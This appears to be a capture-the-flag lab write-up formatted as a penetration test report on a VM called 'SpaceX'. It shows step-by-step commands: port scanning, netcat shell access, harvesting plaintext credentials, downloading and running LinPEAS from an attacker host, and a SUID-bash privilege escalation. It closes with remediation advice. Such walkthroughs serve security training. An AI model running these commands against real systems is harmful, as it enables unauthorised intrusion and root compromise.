# Penetration Testing Report: SpaceX System

## Executive Summary
A comprehensive penetration test was conducted on the target system at IP address 192.168.1.7. The assessment revealed multiple critical security vulnerabilities that allowed complete system compromise, starting from initial reconnaissance and culminating in root-level access. The attack path leveraged anonymous FTP access, exposed shell services, weak credentials, and privilege escalation vulnerabilities.

## Target Information
- **IP Address**: 192.168.1.7
- **MAC Address**: 8A:8F:D8:4C:42:2C (Unknown)
- **Testing Date**: October 21, 2025
- **Testing Methodology**: Black-box penetration testing

## Phase 1: Initial Reconnaissance

### Port Scanning
**Command Executed:**
```bash`
nmap 192.168.1.7 -p-
```

**Scan Results:**
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-21 01:09 CDT
Nmap scan report for 192.168.1.7
Host is up (0.0011s latency).
Not shown: 65526 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
53/tcp   open  domain
80/tcp   open  http
110/tcp  open  pop3
143/tcp  open  imap
993/tcp  open  imaps
995/tcp  open  pop3s
5121/tcp open  unknown
5168/tcp open  scte30
```

### Service Enumeration
**Command Executed:**
```bash
nmap 192.168.1.7 -A
```

**Key Finding:**
- FTP service (port 21) supports Anonymous login

## Phase 2: Service Exploration

### Port 5121 Analysis
**Command Executed:**
```bash
nc 192.168.1.7 5121
```

**Discovery:**
- Unauthenticated shell access available
- Current user context: `champ`

### Initial Shell Exploration
**Commands Executed in Shell:**
```bash
whoami
# Output: champ

cd home/champ
ls
# Contents: flag1.txt and hint.txt

cat hint.txt
# Output: "Use the find command to look for executable files you can run."
# Additional hint: "file name can be encyclo******.sh"
```

## Phase 3: Script Discovery and Credential Harvesting

### Finding the Encyclopedia Script
**Command Executed:**
```bash
find / -type f -iname encyclo*.sh 2>/dev/null
```

**Result:**
```
/lib/open-iscsi/encyclopeida.sh
```

### Script Execution and Credential Discovery
**Command Executed:**
```bash
/lib/open-iscsi/encyclopeida.sh
```

**Output:**
```
username:-champ
password:-champ
```

## Phase 4: SSH Access and User Enumeration

### SSH Login Attempt
**Command Executed:**
```bash
ssh champ@192.168.1.7 -p 5168
```
- Successful login using credentials: champ:champ

### Privilege Assessment
**Command Executed:**
```bash
sudo -l
```
**Output:**
```
champ may not run sudo on spaceX
```

### User Enumeration
**Command Executed:**
```bash
cat /etc/passwd
```

**Relevant Users Found:**
```
trump:x:1001:1001::/home/trump:/bin/bash
champ:x:1002:1002::/home/champ:/bin/bash
```

## Phase 5: Historical Analysis and Lateral Movement

### Bash History Examination
**Command Executed:**
```bash
ls -la
cat .bash_history
```

**Key Bash History Entries:**
```
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2>/dev/null
grep --color=auto -rnw '/etc' -ie "PASSWORD" --color=always 2>/dev/null
```

### Password Discovery Using Historical Method
**Command Executed:**
```bash
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2>/dev/null
```

**Key Finding:**
```
/etc/pam.d/chfn:7:# password:Amazon-2024
```

### Examination of Password File
**Command Executed:**
```bash
cat /etc/pam.d/chfn
```

**File Contents:**
```
#
# The PAM configuration file for the Shadow `chfn' service
#

# This allows root to change user infomation without being
# username:trump
# password:Amazon-2024
# prompted for a password
auth            sufficient      pam_rootok.so

# The standard Unix authentication modules, used with
# NIS (man nsswitch) as well as normal /etc/passwd and
# /etc/shadow entries.
@include common-auth
@include common-account
@include common-session
```

### Lateral Movement to Trump User
**Command Executed:**
```bash
su trump
```
- Password: Amazon-2024
- Successful access gained to trump user account

### Trump User Privilege Assessment
**Command Executed:**
```bash
sudo -l
```
**Output:**
```
trump may not run sudo on SpaceX.
```

## Phase 6: Privilege Escalation to Root

### LinPEAS Enumeration

#### File Transfer Setup
**Attacker Machine (Kali):**
```bash
python3 -m http.server
```

**Target Machine (SpaceX):**
```bash
wget http://192.168.1.8:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

#### Critical LinPEAS Finding
```
╔══════════╣ .sh files in path
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path                                                
You can write script: /usr/local/bin/some.sh
```

### Privilege Escalation Exploitation

#### Writable Script Identification
**Commands Executed:**
```bash
cd /usr/local/bin/
ls -la some.sh
```

#### Exploit Script Creation
**Commands Executed:**
```bash
echo '#!/bin/bash' > /usr/local/bin/some.sh
echo 'cp /bin/bash /tmp/rootbash' >> /usr/local/bin/some.sh
echo 'chown root:root /tmp/rootbash' >> /usr/local/bin/some.sh
echo 'chmod +s /tmp/rootbash' >> /usr/local/bin/some.sh
```

#### Root Shell Execution
**Command Executed:**
```bash
/tmp/rootbash -p
```

**Verification:**
```bash
whoami
# Output: root
```

### Final Flag Capture
**Commands Executed:**
```bash
cd /root
ls
# Output: flag3.txt
cat flag3.txt
```

## Vulnerability Summary

### Critical Vulnerabilities Identified

#### 1. Unauthenticated Shell Service (Critical)
- **Port**: 5121/tcp
- **Risk Level**: Critical
- **Impact**: Direct unauthenticated system access
- **CVSS Score**: 9.8

#### 2. Hardcoded Credentials in Script (High)
- **Location**: `/lib/open-iscsi/encyclopeida.sh`
- **Credentials**: champ:champ
- **Risk Level**: High
- **Impact**: Credential compromise

#### 3. Plaintext Credentials in Configuration (High)
- **Location**: `/etc/pam.d/chfn`
- **Credentials**: trump:Amazon-2024
- **Risk Level**: High
- **Impact**: Lateral movement capability

#### 4. World-Writable Script in PATH (Critical)
- **Location**: `/usr/local/bin/some.sh`
- **Risk Level**: Critical
- **Impact**: Privilege escalation to root

#### 5. Anonymous FTP Access (Medium)
- **Port**: 21/tcp
- **Risk Level**: Medium
- **Impact**: Potential information disclosure

### Attack Chain Visualization
```
Reconnaissance → Port Scanning → Service Discovery → Shell Access (5121) → 
Credential Discovery → SSH Access → User Enumeration → Lateral Movement → 
Privilege Escalation → Root Access
```

## Recommendations

### Immediate Actions (Critical)

1. **Service Hardening**
   - Disable the unauthenticated shell service on port 5121
   - Implement proper authentication mechanisms
   - Disable anonymous FTP access

2. **Credential Management**
   - Remove all hardcoded credentials from scripts and configuration files
   - Implement secure credential storage using vault solutions
   - Conduct credential rotation for all identified accounts

3. **File System Permissions**
   - Review and correct permissions on `/usr/local/bin/`
   - Remove world-writable permissions from system directories
   - Implement regular permission audits

### Medium-term Improvements

1. **Network Security**
   ```bash
   # Example iptables rules to implement
   iptables -A INPUT -p tcp --dport 5121 -j DROP
   iptables -A INPUT -p tcp --dport 21 -s trusted_networks -j ACCEPT
   ```

2. **System Hardening**
   - Implement regular security updates
   - Configure SELinux/AppArmor
   - Remove unnecessary services

3. **Monitoring and Logging**
   - Implement comprehensive audit logging
   - Set up intrusion detection systems
   - Monitor for privilege escalation attempts

### Long-term Security Strategy

1. **Security Training**
   - Secure coding practices for developers
   - System administration security training
   - Incident response procedures

2. **Regular Assessments**
   - Quarterly vulnerability assessments
   - Annual penetration testing
   - Continuous security monitoring

## Evidence Collected

### Flags Captured
1. **flag1.txt** - Initial user flag (champ)
2. **flag3.txt** - Root flag

### Credentials Discovered
- champ:champ (from encyclopeida.sh)
- trump:Amazon-2024 (from /etc/pam.d/chfn)

### Critical Files Modified
- `/usr/local/bin/some.sh` - Created SUID binary
- `/tmp/rootbash` - Root shell binary

## Conclusion

The penetration test successfully demonstrated complete compromise of the target system through a chain of vulnerabilities. The most critical issues were the exposed shell service and inadequate file system permissions that allowed privilege escalation. Immediate remediation is required to address these security gaps and prevent similar attacks in the future.